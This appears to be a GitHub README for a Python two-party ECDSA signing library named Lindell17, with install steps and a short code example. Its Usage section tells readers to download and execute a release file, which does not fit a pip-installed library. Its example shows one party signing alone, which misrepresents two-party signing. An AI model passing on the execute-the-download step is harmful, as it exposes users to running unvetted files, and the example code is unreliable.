## Overview

The Lindell17 project implements a protocol for secure digital signatures using the Elliptic Curve Digital Signature Algorithm (ECDSA). This two-party signing scheme allows two parties to collaboratively generate a digital signature without revealing their private keys. This method enhances security and ensures that no single party has complete control over the signing process.

### What is ECDSA?

ECDSA is a variant of the Digital Signature Algorithm (DSA) which uses elliptic curves. It provides a high level of security with shorter key lengths compared to traditional algorithms like RSA. This makes it efficient and suitable for various applications, especially in constrained environments.

### Importance of Two-Party Signing

The two-party signing scheme offers several advantages:
- **Enhanced Security**: No single party can sign without the other.
- **Trust**: Both parties must agree, reducing the risk of fraud.
- **Flexibility**: Useful in multi-signature scenarios.

## Features

- **Fast Execution**: The implementation is optimized for speed.
- **Secure**: Protects against various cryptographic attacks.
- **Easy Integration**: Can be integrated into existing systems with minimal effort.
- **Comprehensive Documentation**: Detailed instructions and examples are provided.

## Installation

To get started with Lindell17, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/SalmanYT12/lindell17.git
   ```

2. **Navigate to the Project Directory**:
   ```bash
   cd lindell17
   ```

3. **Install Dependencies**:
   Ensure you have the necessary dependencies installed. You can use `pip` for Python projects:
   ```bash
   pip install -r requirements.txt
   ```

## Usage

To use the Fast Secure Two-Party ECDSA Signing scheme, follow these instructions:

1. **Download the Latest Release**: Visit [Releases](https://github.com/SalmanYT12/lindell17/releases) to download the latest version. Make sure to execute the downloaded file as per the provided instructions.

2. **Initialize the Signing Process**:
   Set up the two parties. Each party must generate their key pair and share the public key with the other party.

3. **Sign a Message**:
   Use the provided functions to create a digital signature collaboratively. The process involves both parties participating in generating the final signature.

### Example Code Snippet

Here’s a simple example of how to initiate the signing process:

```python
from lindell17 import ECDSASigner

party1 = ECDSASigner()
party2 = ECDSASigner()

message = b"Hello, this is a test message."
signature = party1.sign(message, party2.public_key)
print("Signature:", signature)
```
